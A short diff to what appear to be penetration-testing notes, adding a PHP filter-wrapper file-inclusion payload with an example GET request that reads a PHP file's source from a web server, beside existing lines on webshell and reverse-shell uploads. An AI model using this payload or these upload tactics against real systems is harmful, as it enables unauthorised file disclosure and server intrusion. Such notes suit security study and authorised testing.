@@ -43,6 +43,10 @@ Where ^
 	forms
 	parameters in url
 
+PHP filter
+	PHP://filter/convert.base64-encode/resource=
+	example: `GET /test.php?view=PHP://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php HTTP/1.1`
+
 webshell or revshell upload
 	use what the system is built on; php, python django, vbscript node.js... perl might also work
 
